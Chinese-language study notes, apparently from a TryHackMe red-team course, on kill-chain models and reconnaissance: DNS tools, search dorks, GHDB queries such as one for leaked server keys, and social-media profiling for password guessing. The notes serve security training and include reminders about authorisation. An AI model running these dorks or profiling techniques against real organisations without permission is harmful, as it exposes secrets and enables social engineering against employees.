<h3 id="交战结构"><a href="#交战结构" class="headerlink" title="交战结构"></a>交战结构</h3><h4 id="红队的核心职能：对抗模拟"><a href="#红队的核心职能：对抗模拟" class="headerlink" title="红队的核心职能：对抗模拟"></a><strong>红队的核心职能：对抗模拟</strong></h4><h5 id="1-红队的对抗模拟（Adversary-Emulation）"><a href="#1-红队的对抗模拟（Adversary-Emulation）" class="headerlink" title="1. 红队的对抗模拟（Adversary Emulation）"></a><strong>1. 红队的对抗模拟（Adversary Emulation）</strong></h5><p>红队的核心职能之一是<strong>模拟真实的攻击者</strong>。虽然不是强制要求，但通常会使用<strong>真实攻击者的工具和方法</strong>，</p>
<ul>
<li><strong>评估企业在面对真实威胁时的防御能力</strong>。</li>
<li><strong>利用不同的“网络攻击链（Cyber Kill Chains）”来总结和评估攻击步骤和战术流程</strong>。</li>
</ul>
<blockquote>
<p><strong>攻击链（Kill Chain）</strong>：是指攻击者在进行网络攻击时的<strong>一系列步骤</strong>，用于描述从最初的侦察到最终攻击目标达成的全过程。</p>
</blockquote>
<p><strong>蓝队</strong>（防御团队）通常利用<strong>攻击链模型</strong>来分析攻击者的行为，并找到阻断攻击的关键点。<br> <strong>红队</strong>可以采用同样的方法，把**真实攻击者的战术、技术和程序（TTPs）**映射到演练过程，评估攻击流程的有效性。</p>
<hr>
<h5 id="2-常见的网络攻击链模型"><a href="#2-常见的网络攻击链模型" class="headerlink" title="2. 常见的网络攻击链模型"></a><strong>2. 常见的网络攻击链模型</strong></h5><p>许多安全法规和标准组织都提出了自己的<strong>网络攻击链</strong>模型，不同模型的结构大致相同，但详细程度和目标设定有所不同。<br> 以下是几个<strong>常见的网络攻击链模型</strong>：</p>
<p>1️⃣ <strong>Lockheed Martin Cyber Kill Chain（洛克希德·马丁攻击链）</strong><br> 2️⃣ <strong>Unified Kill Chain（统一攻击链）</strong><br> 3️⃣ <strong>Varonis Cyber Kill Chain（Varonis 攻击链）</strong><br> 4️⃣ <strong>Active Directory Attack Cycle（AD 攻击周期）</strong><br> 5️⃣ <strong>MITRE ATT&amp;CK Framework（MITRE ATT&amp;CK 框架）</strong></p>
<p>在本次讨论中，我们主要参考 <strong>Lockheed Martin Cyber Kill Chain</strong>，它是目前<strong>红队和蓝队最常使用的标准攻击链模型</strong>。</p>
<hr>
<h5 id="3-Lockheed-Martin-Cyber-Kill-Chain"><a href="#3-Lockheed-Martin-Cyber-Kill-Chain" class="headerlink" title="3. Lockheed Martin Cyber Kill Chain"></a><strong>3. Lockheed Martin Cyber Kill Chain</strong></h5><p>该模型主要<strong>聚焦于外围攻击</strong>（如外部网络入侵），但<strong>对攻击者在内网中的横向移动缺乏详细描述</strong>。<br> 可以将其视为<strong>攻击过程中所有行为和操作的概述</strong>。</p>
<table>
<thead>
<tr>
<th><strong>阶段（Technique）</strong></th>
<th><strong>目的（Purpose）</strong></th>
<th><strong>示例（Examples）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>侦察（Reconnaissance）</strong></td>
<td>获取目标信息</td>
<td>收集电子邮件、OSINT（开源情报）</td>
</tr>
<tr>
<td><strong>武器化（Weaponization）</strong></td>
<td>结合攻击目标与漏洞，生成可利用的恶意载荷</td>
<td>利用漏洞嵌入后门、恶意 Office 文档</td>
</tr>
<tr>
<td><strong>投递（Delivery）</strong></td>
<td>通过某种方式向目标发送恶意载荷</td>
<td>电子邮件、网页、USB 设备</td>
</tr>
<tr>
<td><strong>利用（Exploitation）</strong></td>
<td>利用漏洞执行恶意代码</td>
<td>MS17-010、Zero-Logon 等</td>
</tr>
<tr>
<td><strong>安装（Installation）</strong></td>
<td>安装恶意软件或攻击工具</td>
<td>Mimikatz、Rubeus 等</td>
</tr>
<tr>
<td><strong>命令与控制（Command &amp; Control）</strong></td>
<td>远程控制受感染系统</td>
<td>Empire、Cobalt Strike 等</td>
</tr>
<tr>
<td><strong>达成目标（Actions on Objectives）</strong></td>
<td>执行最终攻击目的，如勒索软件或数据窃取</td>
<td>Conti 勒索软件、LockBit2.0 等</td>
</tr>
</tbody></table>
<hr>
<h4 id="4-关键点总结-1"><a href="#4-关键点总结-1" class="headerlink" title="4. 关键点总结"></a><strong>4. 关键点总结</strong></h4><p>✅ <strong>红队利用攻击链来模拟真实攻击，评估企业的安全防御能力。</strong><br> ✅ <strong>攻击链用于分析攻击者行为，红队和蓝队都可以参考这一模型进行防御优化。</strong><br> ✅ <strong>Lockheed Martin Cyber Kill Chain 主要关注外部攻击，适合用于网络边界防御的安全评估。</strong><br> ✅ <strong>攻击链的每个阶段都有对应的攻击方法和工具，企业可以据此强化不同环节的安全防御措施。</strong></p>
<h2 id="红队侦察"><a href="#红队侦察" class="headerlink" title="红队侦察"></a>红队侦察</h2><h3 id="侦察分类"><a href="#侦察分类" class="headerlink" title="侦察分类"></a>侦察分类</h3><p><strong>侦察（Reconnaissance, recon）可以分为两个部分：</strong></p>
<ol>
<li><strong>被动侦察（Passive Recon）</strong>：可以通过被动观察目标进行。</li>
<li><strong>主动侦察（Active Recon）</strong>：需要与目标进行交互，以诱导其产生响应并进行观察。</li>
</ol>
<h4 id="被动侦察（Passive-Recon）"><a href="#被动侦察（Passive-Recon）" class="headerlink" title="被动侦察（Passive Recon）"></a><strong>被动侦察（Passive Recon）</strong></h4><p>被动侦察不需要直接与目标交互，换句话说，攻击者不会向目标或其所属系统发送任何数据包或请求。相反，被动侦察依赖于<strong>第三方收集和维护的公开可用信息</strong>，通常利用**开源情报（OSINT, Open Source Intelligence）**来获取目标信息。这种侦察方法可能涉及查看目标**公开的社交媒体资料**等。</p>
<p>一些可能收集到的信息包括：</p>
<ul>
<li><strong>域名（Domain Names）</strong></li>
<li><strong>IP 地址块（IP Address Blocks）</strong></li>
<li><strong>电子邮件地址（Email Addresses）</strong></li>
<li><strong>员工姓名（Employee Names）</strong></li>
<li><strong>职位招聘信息（Job Posts）</strong></li>
</ul>
<p>在接下来的任务中，我们将学习如何查询<strong>DNS 记录</strong>，并在“<strong>被动侦察</strong>”的基础上进一步扩展，引入更高级的工具来帮助我们进行信息收集。</p>
<hr>
<h4 id="主动侦察（Active-Recon）"><a href="#主动侦察（Active-Recon）" class="headerlink" title="主动侦察（Active Recon）"></a><strong>主动侦察（Active Recon）</strong></h4><p>主动侦察需要直接与目标交互，即通过发送请求或数据包来观察目标的响应情况。这些<strong>收集到的响应</strong>（或者没有响应的情况）可以帮助我们完善通过<strong>被动侦察</strong>所构建的目标信息。</p>
<p><strong>主动侦察的示例</strong>：</p>
<ul>
<li>使用 <strong>Nmap</strong> 扫描目标子网和存活主机。</li>
<li>其他主动侦察工具可在**主动侦察（Active Reconnaissance）**相关内容中找到。</li>
</ul>
<p><strong>我们希望通过主动侦察发现的信息包括：</strong></p>
<ul>
<li><strong>存活主机（Live Hosts）</strong></li>
<li><strong>运行的服务器（Running Servers）</strong></li>
<li><strong>监听的服务（Listening Services）</strong></li>
<li><strong>软件版本号（Version Numbers）</strong></li>
</ul>
<hr>
<h4 id="主动侦察的分类"><a href="#主动侦察的分类" class="headerlink" title="主动侦察的分类"></a><strong>主动侦察的分类</strong></h4><p>主动侦察可以进一步细分为：</p>
<ol>
<li><strong>外部侦察（External Recon）</strong><ul>
<li>在目标的网络<strong>外部</strong>进行，主要针对<strong>互联网可访问的外部资产</strong>。</li>
<li>示例：使用 <strong>Nikto</strong> 在公司网络外部扫描其 Web 服务器。</li>
</ul>
</li>
<li><strong>内部侦察（Internal Recon）</strong><ul>
<li>在目标公司的<strong>内部网络</strong>中进行。</li>
<li>例如，渗透测试人员或红队成员可能<strong>物理地位于公司内部</strong>，或通过已经被攻陷的主机进行侦察。</li>
<li>示例：使用 <strong>Nessus</strong> 通过目标内部网络中的某台计算机扫描内部资产。</li>
</ul>
</li>
</ol>
<h3 id="内置工具"><a href="#内置工具" class="headerlink" title="内置工具"></a>内置工具</h3><p>本任务重点介绍以下工具的使用：</p>
<ul>
<li><strong>whois</strong></li>
<li><strong>dig、nslookup、host</strong></li>
<li><strong>traceroute&#x2F;tracert</strong></li>
</ul>
<p>在我们开始使用 <strong>whois</strong> 工具之前，先了解一下 <strong>WHOIS</strong>。</p>
<p><strong>WHOIS</strong> 是一种基于请求-响应模式的协议，遵循 <strong>RFC 3912</strong> 规范。WHOIS 服务器会在 <strong>TCP 端口 43</strong> 上监听传入的查询请求。</p>
<p><strong>域名注册商（Registrar）</strong> 负责维护其租赁的<strong>域名 WHOIS 记录</strong>。当我们使用 <strong>whois</strong> 命令查询时，它会向 WHOIS 服务器请求信息，并返回该域名的所有已存储记录。</p>
<p>在以下示例中，whois 查询结果可能包含以下信息：</p>
<ul>
<li><strong>注册商 WHOIS 服务器地址（Registrar WHOIS server）</strong></li>
<li><strong>注册商官网 URL（Registrar URL）</strong></li>
<li><strong>记录创建日期（Record creation date）</strong></li>
<li><strong>记录更新日期（Record update date）</strong></li>
<li><strong>注册人联系方式和地址（Registrant contact info and address）</strong>（若未启用隐私保护）</li>
<li><strong>管理员联系方式和地址（Admin contact info and address）</strong>（若未启用隐私保护）</li>
<li><strong>技术联系方式和地址（Tech contact info and address）</strong>（若未启用隐私保护）</li>
</ul>
<h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><p><img src="/../imgs/$%7Bfiilename%7D/image-20250322194629077.png" alt="image-20250322194629077"></p>
<p>我们用ai整理信息更为直观</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250322194656108.png" alt="image-20250322194656108"></p>
<h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>

<p>该命令用于查询 <code>baidu.com</code> 的 DNS 解析情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=AAAA baidu.com</span><br></pre></td></tr></table></figure>

<p>查询 IPv6 地址（AAAA 记录）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure>

<p>使用 8.8.8.8 查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=MX baidu.com</span><br></pre></td></tr></table></figure>

<p>查询 MX（邮件交换）记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=NS baidu.com</span><br></pre></td></tr></table></figure>

<p>查询 NS（Name Server）记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=TXT baidu.com</span><br></pre></td></tr></table></figure>

<p>查询 TXT 记录</p>
<h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><p>在类 Unix 系统中，另一个常见的 DNS 查询工具是 <strong>dig</strong>，全称 <strong>Domain Information Groper</strong>（域名信息查询工具）。<br> <code>dig</code> 提供了丰富的查询选项，甚至允许你指定不同的 <strong>DNS 服务器</strong> 进行查询。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250322210648448.png" alt="image-20250322210648448"></p>
<p>很显然dig的信息更为详细</p>
<h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p> 解析 <code>A 记录</code>（IPv4 地址）</p>
<p> 解析 <code>MX 记录</code>（邮件服务器）</p>
<p><strong>如果只是快速查 IP 地址或 MX 记录，<code>host</code> 最方便</strong>。</p>
<p><strong>如果需要更详细的 DNS 解析过程，推荐使用 <code>dig</code></strong>。</p>
<h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p>最后一个 Unix 类系统自带的工具是 <code>traceroute</code>，在 Windows 系统上称为 <code>tracert</code>。顾名思义，它用于 <strong>跟踪数据包从我们的系统到目标主机所经过的路由</strong>。</p>
<p>下面的终端输出展示了 <code>traceroute</code> 解析出的 <strong>连接我们与目标系统的路由器（跳点）</strong>。<br> 需要强调的是：<strong>某些路由器不会响应 <code>traceroute</code> 发送的数据包</strong>，因此我们无法看到它们的 IP 地址，在这种情况下，<code>traceroute</code> 会用 <code>*</code> 号表示这些不可见的路由器。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250322212244360.png" alt="image-20250322212244360"></p>
<h3 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h3><p>能够高效使用搜索引擎是一项至关重要的技能。以下表格展示了一些在多个流行搜索引擎中常用的搜索修饰符：</p>
<table>
<thead>
<tr>
<th><strong>符号 &#x2F; 语法</strong></th>
<th><strong>功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>&quot;search phrase&quot;</code></td>
<td>查找完全匹配的短语</td>
</tr>
<tr>
<td><code>OSINT filetype:pdf</code></td>
<td>查找与特定术语相关的 PDF 文件</td>
</tr>
<tr>
<td><code>salary site:blog.tryhackme.com</code></td>
<td>将搜索结果限制在特定网站</td>
</tr>
<tr>
<td><code>pentest -site:example.com</code></td>
<td>排除特定网站的搜索结果</td>
</tr>
<tr>
<td><code>walkthrough intitle:TryHackMe</code></td>
<td>查找标题包含特定术语的网页</td>
</tr>
<tr>
<td><code>challenge inurl:tryhackme</code></td>
<td>查找 URL 包含特定术语的网页</td>
</tr>
</tbody></table>
<p>🔹 <strong>分析</strong>：</p>
<ul>
<li><code>filetype:</code> 可以用于搜索多种文件类型，如 <code>doc, docx, ppt, pptx, xls, xlsx</code> 等，这在 <strong>OSINT（开源情报）</strong> 领域非常有用。</li>
<li><code>site:</code> 让用户能够精准搜索特定网站，而 <code>-site:</code> 则用于排除某个网站的内容。</li>
<li><code>intitle:</code> 和 <code>inurl:</code> 有助于定位特定网页，如 <code>inurl:admin</code> 可能会返回管理员面板页面。</li>
</ul>
<p>每个搜索引擎的规则和语法可能略有不同，因此用户需要查阅其帮助页面。例如：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.google.com/advanced_search">Google 高级搜索</a> 提供了一个可视化界面，帮助用户构造高级查询。</li>
<li><a target="_blank" rel="noopener" href="https://support.google.com/websearch/answer/2466433">Google Refine Web Searches</a> 详细介绍了 Google 的高级搜索技巧。</li>
<li><a target="_blank" rel="noopener" href="https://help.duckduckgo.com/advanced-search/">DuckDuckGo Search Syntax</a> 适用于 DuckDuckGo。</li>
<li><a target="_blank" rel="noopener" href="https://www.bing.com/search?q=Bing+advanced+search+options">Bing Advanced Search Options</a> 适用于 Bing。</li>
</ul>
<hr>
<h5 id="搜索引擎如何泄露敏感信息？"><a href="#搜索引擎如何泄露敏感信息？" class="headerlink" title="搜索引擎如何泄露敏感信息？"></a><strong>搜索引擎如何泄露敏感信息？</strong></h5><p>搜索引擎会不断抓取并索引全球网页，这可能导致机密信息被意外公开，如：</p>
<ul>
<li><strong>内部公司文档</strong></li>
<li><strong>包含用户名、电子邮件、甚至密码的表格</strong></li>
<li><strong>存储敏感数据的目录</strong></li>
<li><strong>Web 服务的版本信息（可能存在漏洞）</strong></li>
<li><strong>错误日志（可能暴露系统详细信息）</strong></li>
</ul>
<p>📌 <strong>分析</strong>：<br> 这些敏感信息可能通过 Google Dorking（谷歌黑客技巧）被轻松找到。Google Hacking Database（GHDB）收集了许多用于挖掘敏感信息的搜索语句，例如：</p>
<table>
<thead>
<tr>
<th><strong>GHDB 类别</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Footholds</strong>（初始访问点）</td>
<td><code>intitle:&quot;index of&quot; &quot;nginx.log&quot;</code> （查找 Nginx 日志，可能暴露服务器配置信息）</td>
</tr>
<tr>
<td><strong>Files Containing Usernames</strong>（包含用户名的文件）</td>
<td><code>intitle:&quot;index of&quot; &quot;contacts.txt&quot;</code> （查找联系人信息）</td>
</tr>
<tr>
<td><strong>Sensitive Directories</strong>（敏感目录）</td>
<td><code>inurl:/certs/server.key</code> （查找是否有私钥泄露）</td>
</tr>
<tr>
<td><strong>Web Server Detection</strong>（检测 Web 服务器）</td>
<td><code>intitle:&quot;GlassFish Server - Server Running&quot;</code> （识别 GlassFish 服务器）</td>
</tr>
<tr>
<td><strong>Vulnerable Files</strong>（易受攻击的文件）</td>
<td><code>intitle:&quot;index of&quot; &quot;*.php&quot;</code> （搜索可执行 PHP 文件）</td>
</tr>
<tr>
<td><strong>Vulnerable Servers</strong>（易受攻击的服务器）</td>
<td><code>intext:&quot;user name&quot; intext:&quot;orion core&quot; -solarwinds.com</code> （查找 SolarWinds Orion 控制台）</td>
</tr>
<tr>
<td><strong>Error Messages</strong>（错误信息）</td>
<td><code>intitle:&quot;index of&quot; errors.log</code> （查找错误日志文件）</td>
</tr>
</tbody></table>
<p><strong>重要提醒</strong> ⚠️： 这些查询会返回所有符合条件的公开数据，可能包含敏感信息。为了避免法律问题，<strong>请确保仅在授权范围内使用这些搜索技巧</strong>。</p>
<hr>
<h5 id="其他-OSINT-数据来源"><a href="#其他-OSINT-数据来源" class="headerlink" title="其他 OSINT 数据来源"></a><strong>其他 OSINT 数据来源</strong></h5><p>除了搜索引擎，以下来源也能提供有价值的信息：</p>
<ol>
<li><strong>社交媒体（Social Media）</strong><ul>
<li>人们可能会在 LinkedIn、Twitter、Facebook 等平台上发布公司相关信息，如员工名单、内部项目、电子邮件格式等。</li>
<li><code>site:linkedin.com &quot;company name&quot; &quot;job title&quot;</code> 可以帮助定位公司员工。</li>
</ul>
</li>
<li><strong>招聘广告（Job Ads）</strong><ul>
<li>企业在招聘广告中可能会透露其使用的技术栈，例如：“要求熟悉 <strong>AWS, Kubernetes, Python</strong>” 可能暗示公司使用这些技术。</li>
<li><code>site:indeed.com &quot;company name&quot; &quot;hiring&quot;</code> 可用于收集公司招聘相关信息。</li>
</ul>
</li>
</ol>
<p>📌 <strong>总结</strong>：</p>
<ul>
<li><strong>善用搜索修饰符</strong>，如 <code>filetype:</code>, <code>site:</code>, <code>intitle:</code>, <code>inurl:</code> 等，进行精准搜索。</li>
<li><strong>利用 GHDB（Google Hacking Database）</strong> 发现潜在的敏感信息。</li>
<li><strong>结合社交媒体和招聘广告</strong> 进行 OSINT 调查，无需直接访问目标系统。</li>
</ul>
<p>🔎 <strong>推荐进一步学习</strong>：</p>
<ul>
<li>访问 <strong>Google Dorking 练习场</strong>，提高搜索技能。</li>
<li>探索 <strong>Shodan.io</strong>，该搜索引擎专门用于查找在线设备（如摄像头、路由器、数据库服务器等）。</li>
<li>了解 <strong>TheHarvester</strong>，这是一款自动化 OSINT 工具，可用于收集电子邮件、子域名、员工信息等。</li>
</ul>
<p>这样，你可以在合法范围内高效收集有价值的信息，同时避免不必要的法律风险。 🚀</p>
<h5 id="社交媒体"><a href="#社交媒体" class="headerlink" title="社交媒体"></a><strong>社交媒体</strong></h5><p>社交媒体网站不仅在个人用途上非常流行，同时在企业应用方面也被广泛使用。这些平台可能会暴露大量与目标相关的信息。尤其是许多用户往往会过度分享自己的个人和工作细节，因此值得重点关注以下平台：</p>
<ul>
<li><strong>LinkedIn</strong>（领英）</li>
<li><strong>Twitter</strong>（推特）</li>
<li><strong>Facebook</strong>（脸书）</li>
<li><strong>Instagram</strong>（照片墙）</li>
</ul>
<p>社交媒体网站使得收集某个公司员工的姓名变得十分容易。此外，在某些情况下，你可能会获取特定的信息，这些信息可能揭示密码找回问题的答案，或者为定制化字典（wordlist）提供线索。技术人员的帖子可能会透露有关公司系统和供应商的详细信息。例如，如果一名网络工程师最近获得了 <strong>Juniper（瞻博网络）</strong> 认证，这可能暗示其公司环境中使用了 Juniper 的网络基础设施。</p>
<hr>
<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h6><p>📌 <strong>1. 社交媒体在 OSINT（开源情报）中的作用</strong></p>
<ul>
<li><strong>信息收集</strong>：社交平台可以帮助黑客或安全研究员收集目标公司的员工信息、技术栈、内部项目等。</li>
<li><strong>社会工程学攻击（Social Engineering）</strong>：过度分享的个人信息（如宠物名字、出生日期、喜欢的电影）可能用于 <strong>密码重置问题</strong> 或 <strong>密码猜测</strong>。</li>
<li><strong>目标字典（Wordlist Generation）</strong>：可以从用户的公开信息（如昵称、工作经历、兴趣爱好）生成用于暴力破解的字典。</li>
</ul>
<p>📌 <strong>2. 各大社交平台的 OSINT 价值</strong></p>
<table>
<thead>
<tr>
<th><strong>社交平台</strong></th>
<th><strong>可获取的信息</strong></th>
<th><strong>潜在用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>LinkedIn</strong></td>
<td>公司员工名单、职位、技术栈、工作经历</td>
<td>构建公司组织架构，分析技术使用情况</td>
</tr>
<tr>
<td><strong>Twitter</strong></td>
<td>公开言论、兴趣爱好、生活细节</td>
<td>获取个人背景，识别可利用的信息</td>
</tr>
<tr>
<td><strong>Facebook</strong></td>
<td>朋友列表、照片、兴趣、位置记录</td>
<td>用于社会工程学攻击、身份伪造</td>
</tr>
<tr>
<td><strong>Instagram</strong></td>
<td>生活照片、打卡位置、关注列表</td>
<td>了解目标社交圈，分析生活习惯</td>
</tr>
</tbody></table>
<p>📌 <strong>3. 案例分析</strong></p>
<ul>
<li><strong>案例 1：密码猜测</strong><ul>
<li>目标在 Instagram 上晒宠物照，并配文：“这是我最爱的狗狗 Max！”</li>
<li>可能的密码：<code>Max123</code>, <code>ILoveMax</code>, <code>Max2025!</code></li>
<li>如果他用相似密码进行工作登录，就可能成为攻击目标。</li>
</ul>
</li>
<li><strong>案例 2：供应链攻击</strong><ul>
<li>目标公司员工在 LinkedIn 上发帖：“很高兴我们公司最近部署了 Palo Alto 防火墙！”</li>
<li>可能的利用点：攻击者可以寻找 Palo Alto 的已知漏洞，或者针对相关厂商进行供应链攻击。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h6><p>✅ <strong>社交媒体是 OSINT 调查的重要工具</strong>，可以获取大量目标相关的信息。<br> ✅ <strong>用户的过度分享可能成为安全隐患</strong>，需要注意隐私保护。<br> ✅ <strong>攻击者可以利用这些信息进行社会工程学攻击</strong>，如密码猜测、目标字典生成等。<br> ✅ <strong>企业应加强安全意识培训</strong>，避免员工在社交媒体上泄露敏感信息。</p>
<p>🔎 <strong>推荐工具</strong>：</p>
<ul>
<li><strong>theHarvester</strong>：自动收集 LinkedIn、Twitter 等社交平台上的公司和员工信息。</li>
<li><strong>Maltego</strong>：可视化社交网络分析工具，用于挖掘目标的社交关系。</li>
<li><strong>Google Dorking</strong>：结合 <code>site:linkedin.com</code> 等搜索技巧，精准定位社交媒体信息。</li>
</ul>
<p>这样，你可以在合法范围内高效利用社交媒体进行 OSINT 研究，同时避免不必要的安全风险！ 🚀</p>
<h5 id="招聘广告（Job-Ads）"><a href="#招聘广告（Job-Ads）" class="headerlink" title="招聘广告（Job Ads）"></a><strong>招聘广告（Job Ads）</strong></h5><p>招聘广告也能透露许多有关公司的信息。除了可能暴露姓名和电子邮件地址外，<strong>技术职位</strong>的招聘信息还可能提供关于目标公司<strong>系统和基础设施</strong>的线索。不同国家流行的招聘网站可能有所不同，因此，请务必查看客户公司可能发布招聘信息的国家的求职网站。此外，访问公司官网上的<strong>招聘页面</strong>，也可能会获取一些有价值的信息。</p>
<p>值得注意的是，<strong>Wayback Machine（互联网档案馆）</strong> 可以用来<strong>检索公司招聘页面的历史版本</strong>，帮助分析过去的技术变更和相关信息。</p>
<h3 id="专业搜索引擎"><a href="#专业搜索引擎" class="headerlink" title="专业搜索引擎"></a>专业搜索引擎</h3><h4 id="WHOIS-和-DNS-相关信息（WHOIS-and-DNS-Related）"><a href="#WHOIS-和-DNS-相关信息（WHOIS-and-DNS-Related）" class="headerlink" title="WHOIS 和 DNS 相关信息（WHOIS and DNS Related）"></a><strong>WHOIS 和 DNS 相关信息（WHOIS and DNS Related）</strong></h4><p>除了我们在 介绍的标准 <strong>WHOIS</strong> 和 <strong>DNS 查询工具</strong>，还有一些<strong>第三方机构</strong>提供<strong>付费的历史 WHOIS 数据</strong>服务。例如，<strong>WHOIS history</strong> 提供<strong>WHOIS 记录的历史数据</strong>，如果域名注册者<strong>没有使用 WHOIS 隐私保护</strong>，这类服务可能会非常有用。</p>
<p>目前，有一些网站提供<strong>免费的高级 DNS 服务</strong>，这些网站功能<strong>强大</strong>，甚至可以专门为某个域名提供深入分析。这里，我们重点关注<strong>关键的 DNS 相关信息</strong>，主要包括以下内容：</p>
<ol>
<li><strong>ViewDNS.info</strong></li>
<li><strong>Threat Intelligence Platform</strong></li>
</ol>
<h4 id="ViewDNS-info"><a href="#ViewDNS-info" class="headerlink" title="ViewDNS.info"></a><strong>ViewDNS.info</strong></h4><p><strong>ViewDNS.info</strong> 提供 <strong>反向 IP 查询（Reverse IP Lookup）</strong>。</p>
<p><strong>背景知识</strong>：</p>
<ul>
<li>传统上，每台<strong>Web 服务器</strong>都会使用一个或多个<strong>唯一的 IP 地址</strong>。</li>
<li>但如今，**共享主机（Shared Hosting）*<em>越来越普遍，**多个不同的域名**可能会共享*<em>同一个 IP 地址</em></em>。</li>
<li><strong>反向 IP 查询</strong> 允许我们通过<strong>一个域名或 IP 地址</strong>，找到<strong>所有与该 IP 地址关联的其他域名</strong>。</li>
</ul>
<p><strong>示例分析</strong>：<br> 在下面的示例中，我们使用<strong>反向 IP 查询</strong>找出了与 <strong>cafe.thmredteam.com</strong> 共享相同 IP 地址的<strong>其他服务器</strong>。<br> 因此，仅仅知道某个<strong>IP 地址</strong>，并不一定意味着它<strong>只对应一个特定的网站</strong>，它可能属于<strong>多个网站的共享服务器</strong>。</p>
<hr>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a><strong>分析</strong></h4><p>📌 <strong>1. 为什么历史 WHOIS 数据重要？</strong></p>
<ul>
<li>如果目标网站<strong>现在</strong>使用了 WHOIS 隐私保护（如 Cloudflare 或 GoDaddy 提供的匿名服务），那么<strong>当前 WHOIS 数据可能无法获取具体的注册人信息</strong>。</li>
<li>但如果该域名<strong>过去</strong>没有开启隐私保护，历史 WHOIS 记录可能包含<strong>原始的注册人信息、电子邮件、注册公司等</strong>。</li>
<li>这对**渗透测试、OSINT 调查和社工攻击（Social Engineering）**都很有帮助。</li>
</ul>
<p>📌 <strong>2. 反向 IP 查询的应用场景</strong></p>
<table>
<thead>
<tr>
<th><strong>场景</strong></th>
<th><strong>作用</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>共享主机</strong></td>
<td>查找与目标 IP 关联的其他域名</td>
<td>发现同服务器上的潜在目标</td>
</tr>
<tr>
<td><strong>子域名发现</strong></td>
<td>通过同一 IP 地址推测可能的子域名</td>
<td>扩展攻击面，发现隐藏服务</td>
</tr>
<tr>
<td><strong>旁站攻击</strong></td>
<td>发现同服务器上的其他网站</td>
<td>通过弱点网站进入目标服务器</td>
</tr>
<tr>
<td><strong>识别恶意活动</strong></td>
<td>追踪黑客控制的多个网站</td>
<td>威胁情报分析</td>
</tr>
</tbody></table>
<p>📌 <strong>3. OSINT 工具推荐</strong></p>
<ul>
<li><strong>ViewDNS.info（<a target="_blank" rel="noopener" href="https://viewdns.info)/">https://viewdns.info）</a></strong><ul>
<li>提供反向 IP 查询、WHOIS 历史、DNS 记录等功能。</li>
</ul>
</li>
<li><strong>SecurityTrails（<a target="_blank" rel="noopener" href="https://securitytrails.com)/">https://securitytrails.com）</a></strong><ul>
<li>提供详细的<strong>历史 DNS 记录</strong>，包括<strong>A 记录、MX 记录</strong>等。</li>
</ul>
</li>
<li><strong>Threat Intelligence Platform（<a target="_blank" rel="noopener" href="https://threatintelligenceplatform.com)/">https://threatintelligenceplatform.com）</a></strong><ul>
<li>分析域名的安全状况，识别恶意行为。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>✅ <strong>历史 WHOIS 数据可以挖掘域名的注册人信息，特别是在没有启用 WHOIS 隐私保护的情况下。</strong><br> ✅ <strong>反向 IP 查询可以发现与目标 IP 共享的其他网站，有助于扩展攻击面（旁站攻击）。</strong><br> ✅ <strong>多个在线工具（如 ViewDNS.info、SecurityTrails）可以帮助进行 DNS 相关的 OSINT 调查。</strong><br> ✅ <strong>共享主机环境下，不能仅依赖 IP 地址识别唯一目标，需要结合子域名爆破等方法进行深入分析。</strong> 🚀</p>
<h4 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h4><p><a target="_blank" rel="noopener" href="https://search.censys.io/">Censys Search</a> 可以提供大量有关 IP 地址和域的信息。在此示例中，我们查找解析为 的 IP 地址之一。我们可以轻松推断出我们查找的 IP 地址属于 Cloudflare。我们可以看到与端口 80 和 443 等相关的信息；但是，很明显，此 IP 地址用于为除 之外的网站提供服务。换句话说，此 IP 地址属于我们的客户 <a target="_blank" rel="noopener" href="https://cafe.thmredteam.com/">Organic Cafe</a> 以外的公司。做出这种区分至关重要，这样我们就不会探测合同范围之外的系统。</p>
<p><code>shodan host IP_ADDRESS</code> ，我们可以获取 IP 地址的地理位置和开放端口</p>
<h3 id="Recon-ng"><a href="#Recon-ng" class="headerlink" title="Recon-ng"></a>Recon-ng</h3><p>综合工具具有各种模块(和msf类似)</p>
<h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><p>Maltego 是一款强大的 <strong>信息收集与可视化分析工具</strong>，专为 <strong>OSINT（开源情报）</strong> 和 <strong>网络渗透测试</strong> 设计。它能够从 <strong>公开数据源</strong>（如搜索引擎、社交媒体、WHOIS、DNS、Shodan 等）收集信息，并以 <strong>图形化方式展示数据关联</strong>，帮助分析目标组织、人员、基础设施之间的关系。</p>
<p>Maltego 适用于：</p>
<ul>
<li><strong>网络安全分析</strong>：识别目标的网络资产（域名、IP、邮件、子域等）。</li>
